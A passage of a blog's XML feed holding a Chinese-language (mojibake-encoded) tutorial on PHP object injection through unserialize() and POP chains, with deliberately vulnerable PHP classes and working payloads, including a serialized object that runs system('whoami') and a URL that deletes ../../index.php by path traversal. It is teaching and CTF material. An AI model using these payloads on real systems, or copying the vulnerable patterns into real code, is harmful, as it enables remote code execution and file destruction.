id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><code>import gmpy2</code></p><p>å…·ä½“ä½¿ç”¨å§¿åŠ¿å¯ä»¥ç™¾åº¦æˆ–è€…Googleï¼Œçœ‹å®˜æ–¹æ–‡æ¡£å½“ç„¶æ˜¯æœ€å¥½çš„ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/pcat/">pcat</a></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP Object Injection(å¯¹è±¡æ³¨å…¥)</title>
    <link href="/2020/02/26/PHP_Object_Injection/"/>
    <url>/2020/02/26/PHP_Object_Injection/</url>
    
    <content type="html"><![CDATA[<p>PHPå¯¹è±¡æ³¨å…¥æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºçº§åˆ«çš„æ¼æ´ï¼Œæ ¹æ®ä¸Šä¸‹æ–‡ï¼Œè¯¥æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä¸åŒç§ç±»çš„æ¶æ„æ”»å‡»ï¼Œä¾‹å¦‚ä»£ç æ³¨å…¥ï¼ŒSQLæ³¨å…¥ï¼Œè·¯å¾„éå†å’Œåº”ç”¨ç¨‹åºæ‹’ç»æœåŠ¡ã€‚ å¦‚æœåœ¨å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ä¼ é€’ç»™PHPå‡½æ•°<code>unserialize()</code>ä¹‹å‰ï¼Œæœªå¯¹ç”¨æˆ·æä¾›çš„è¾“å…¥è¿›è¡Œæ­£ç¡®çš„æ£€éªŒï¼Œåˆ™ä¼šå‘ç”Ÿæ­¤æ¼æ´ã€‚ ç”±äºPHPå…è®¸å¯¹è±¡åºåˆ—åŒ–ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥å°†ä¸´æ—¶åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¼ é€’ç»™æ˜“å—æ”»å‡»çš„<code>unserialize()</code>è°ƒç”¨ï¼Œä»è€Œå°†ä»»æ„PHPå¯¹è±¡æ³¨å…¥åº”ç”¨ç¨‹åºèŒƒå›´ã€‚</p><h1 id="PHPå¸¸ç”¨é­”æœ¯æ–¹æ³•"><a href="#PHPå¸¸ç”¨é­”æœ¯æ–¹æ³•" class="headerlink" title="PHPå¸¸ç”¨é­”æœ¯æ–¹æ³•"></a>PHPå¸¸ç”¨é­”æœ¯æ–¹æ³•</h1><ul><li><code>__construct()</code> : å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶(å®ä¾‹åŒ–)å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œåˆå§‹åŒ–å·¥ä½œæ‰§è¡Œã€‚</li><li><code>__destruct()</code> : ææ„å‡½æ•°ï¼Œææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</li><li><code>__sleep()</code> : <code>serialize()</code> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«ååºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚</li><li><code>__wakeup()</code> : ä¸<code>__sleep()</code> ç›¸åï¼Œ<code>unserialize()</code> ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code> æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code>ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ä½œç”¨ä¾‹å¦‚ï¼šé‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</li><li><code>__toString()</code> : ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”è¯¥æ€ä¹ˆå›åº”ï¼Œä¾‹å¦‚ <code>echo $obj;</code> æ—¶åº”è¯¥æ˜¾ç¤ºä»€ä¹ˆã€‚</li><li><code>__get()</code>  : è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ã€‚</li><li><code>__set()</code> : è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ã€‚</li><li><code>__invoke()</code> : è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•ã€‚</li><li><code>__call()</code> : åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶ï¼Œ<code>__call()</code> ä¼šè¢«è°ƒç”¨ã€‚</li><li><code>__callStatic()</code> : åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__callStatic()</code> ä¼šè¢«è°ƒç”¨ã€‚</li></ul><p><code>__call()</code> å’Œ <code>__callStatic()</code> æ˜¯å¯¹æ–¹æ³•çš„é‡è½½ï¼Œå‚æ•°ä¸º<code>($name, $arguments)</code>ï¼Œ<code>$name</code>å‚æ•°æ˜¯è¦è°ƒç”¨çš„æ–¹æ³•åç§°ï¼Œ<code>$arguments</code>å‚æ•°æ˜¯ä¸€ä¸ªæšä¸¾æ•°ç»„ï¼ŒåŒ…å«ç€è¦ä¼ é€’ç»™æ–¹æ³• <code>$name</code> çš„å‚æ•°ã€‚</p><p>è¯¦ç»†è§<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">æ–‡æ¡£</a></p><p>å½“ç„¶ä¹Ÿå¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡æœ‰å…³ <code>Wrapper Phar://</code> çš„<a href="">åšå®¢</a></p><p>ä¸ºäº†æˆåŠŸåˆ©ç”¨PHPå¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li>è¯¥åº”ç”¨ç¨‹åºå¿…é¡»å…·æœ‰ä¸€ä¸ªå®ç°PHPé­”æœ¯æ–¹æ³•çš„ç±»ï¼ˆä¾‹å¦‚<code>__wakeup</code>æˆ–<code>__destruct</code>ï¼‰ï¼Œè¯¥æ–¹æ³•å¯ç”¨äºè¿›è¡Œæ¶æ„æ”»å‡»æˆ–å¯åŠ¨â€œ POPé“¾â€ã€‚</li><li>åœ¨æ”»å‡»ä¸­ä½¿ç”¨çš„æ‰€æœ‰ç±»éƒ½å¿…é¡»åœ¨è°ƒç”¨æ˜“å—æ”»å‡»çš„<code>unserialize()</code>æ—¶å£°æ˜ï¼Œå¦åˆ™æ­¤ç±»ç±»å¿…é¡»æ”¯æŒå¯¹è±¡è‡ªåŠ¨åŠ è½½ã€‚</li></ul><p>ååºåˆ—åŒ–æ ¼å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;i:<span class="hljs-number">20</span>;&#125;<br>å¯¹è±¡ç±»å‹:é•¿åº¦:<span class="hljs-string">&quot;åå­—&quot;</span>:ç±»ä¸­å˜é‡çš„ä¸ªæ•°:&#123;ç±»å‹:é•¿åº¦:<span class="hljs-string">&quot;åå­—&quot;</span>;ç±»å‹:é•¿åº¦:<span class="hljs-string">&quot;å€¼&quot;</span>;......&#125;<br></code></pre></td></tr></table></figure><p>ç±»å‹å­—æ¯ï¼š</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tsx">a - array                  b - <span class="hljs-built_in">boolean</span>  <br>d - double                 i - integer<br>o - common <span class="hljs-built_in">object</span>          r - reference<br>s - <span class="hljs-built_in">string</span>                 C - custom <span class="hljs-built_in">object</span><br>O - <span class="hljs-keyword">class</span>                  <span class="hljs-title class_">N</span> - <span class="hljs-literal">null</span><br>R - pointer reference      U - unicode <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p>å½“å˜é‡ä¸º <code>private</code> ï¼Œ<code>protected</code>æ—¶ï¼Œå˜é‡ä¼šå¤šä¸¤ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯å› ä¸ºå¯¹è±¡çš„ç§æœ‰æˆå‘˜å…·æœ‰åŠ å…¥æˆå‘˜åç§°çš„ç±»åç§°;å—ä¿æŠ¤çš„æˆå‘˜åœ¨æˆå‘˜åå‰é¢åŠ ä¸Š<code>*</code>ã€‚è¿™äº›å‰ç¼€å€¼åœ¨ä»»ä¸€ä¾§éƒ½æœ‰ç©ºå­—èŠ‚ã€‚</p><h1 id="wakeup-in-the-unserialize-function"><a href="#wakeup-in-the-unserialize-function" class="headerlink" title="__wakeup() in the unserialize function"></a>__wakeup() in the unserialize function</h1><blockquote><p><strong>unserialize()</strong> takes a single serialized variable and converts it back into a PHP value.</p><p>If the variable being unserialized is an object, after successfully reconstructing the object PHP will automatically attempt to call the <a href="https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup">__wakeup()</a> member function (if it exists).</p></blockquote><p>æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PHPObjectInjection</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$inject</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment"># nothing todo here</span><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;inject))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;inject);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hz&#x27;</span>]))&#123;  <br>        <span class="hljs-variable">$varrr</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hz&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$varrr</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>.<span class="hljs-variable">$varrr</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot; - &quot;</span>.<span class="hljs-variable">$varrr</span>[<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># nothing happens here</span><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä»¬æƒ³æ‰§è¡Œ <code>whoami</code> æŒ‡ä»¤ï¼Œæˆ‘ä»¬æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PHPObjectInjection</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$inject</span> = <span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;inject))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;inject);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PHPObjectInjection</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ° Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;PHPObjectInjection&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;inject&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¾“å‡ºæ‰§è¡Œ <code>whoami</code> åçš„ç»“æœã€‚</p><h1 id="destruct-in-the-unserialize-function"><a href="#destruct-in-the-unserialize-function" class="headerlink" title="__destruct() in the unserialize function"></a>__destruct() in the unserialize function</h1><p>æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example1</span></span><br><span class="hljs-class"></span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$cache_file</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-comment">// some PHP code...</span><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;/var/www/cache/tmp/<span class="hljs-subst">&#123;$this-&gt;cache_file&#125;</span>&quot;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// some PHP code...</span><br><br><span class="hljs-variable">$user_data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><br><span class="hljs-comment">// some PHP code...</span><br></code></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿé€šè¿‡<a href="https://owasp.org/www-community/vulnerabilities/Path_Traversal">è·¯å¾„éå†</a>æ”»å‡»åˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼Œè¯·æ±‚ä»¥ä¸‹URLï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1:&#123;s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;&#125;<br></code></pre></td></tr></table></figure><h1 id="toString-in-the-unserialize-function"><a href="#toString-in-the-unserialize-function" class="headerlink" title="__toString() in the unserialize function"></a>__toString() in the unserialize function</h1><p>ä½¿ç”¨â€POPé“¾â€ æ‰§è¡Œ<a href="https://owasp.org/www-community/vulnerabilities/SQL_Injection">SQLæ³¨å…¥</a>æ”»å‡»ï¼Œä¾‹å¦‚é€šè¿‡åˆ©ç”¨<code>__toString</code>æ–¹æ³•</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example3</span></span><br><span class="hljs-class"></span>&#123;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-comment">// some PHP code...</span><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj)) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getValue</span>();<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// some PHP code...</span><br><br><span class="hljs-variable">$user_data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><br><span class="hljs-comment">// some PHP code...</span><br></code></pre></td></tr></table></figure><h1 id="POPé“¾çš„å¯»æ‰¾"><a href="#POPé“¾çš„å¯»æ‰¾" class="headerlink" title="POPé“¾çš„å¯»æ‰¾"></a>POPé“¾çš„å¯»æ‰¾</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in flag.php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>            <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;pop.php&#x27;</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&#x27;Welcome&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/https/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/https/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;pop.php&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">&#x27;pop.php&#x27;</span>);<br>        <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>å…ˆç†ä¸€ç†å…³ç³»ï¼Œæˆ‘ä»¬æ—¢ç„¶è¦è¯» <code>flag.php</code> ï¼Œé‚£å°±éœ€è¦æ‰¾åˆ°è¯»æ–‡ä»¶çš„åœ°æ–¹ï¼Œæ¯”å¦‚ <code>Show</code> ç±»é‡Œé¢çš„ <code>highlight_file()</code> å’Œ <code>Read</code> ç±»é‡Œé¢çš„ <code>file_get_contents()</code>ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œéœ€è¦ç”¨åˆ° <code>file_get_contents()</code>ï¼Œè¦ç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼Œå‰ææ˜¯è°ƒç”¨ <code>file_get()</code> å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥çŸ¥é“éœ€è¦è§¦å‘ <code>__invoke()</code>ï¼Œè¿™ä¸ªé­”æœ¯æ–¹æ³•æ˜¯å½“ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿåˆ° <code>Test</code> ç±»é‡Œé¢çš„ <code>__get()</code> å‡½æ•°ï¼Œè¿™ä¸ªé­”æœ¯æ–¹æ³•åˆæ˜¯è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ä¼šè¢«è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ¥åˆ° <code>Show</code> ç±»çš„ <code>__toString()</code> å‡½æ•°ï¼Œè¿™é‡Œæ˜¯è°ƒç”¨äº† <code>str</code> è¿™ä¸ªæ•°ç»„é‡Œ key ä¸º<code>str</code> çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ <code>source</code>ï¼Œé‚£ä¹ˆå°†å®ƒæŒ‡å‘ <code>Test</code> ç±»ï¼Œè®©å®ƒå¯ä»¥è§¦å‘ <code>__get()</code>ï¼Œå¥½äº†ï¼Œæ—¢ç„¶è§¦å‘äº† <code>__toString</code> 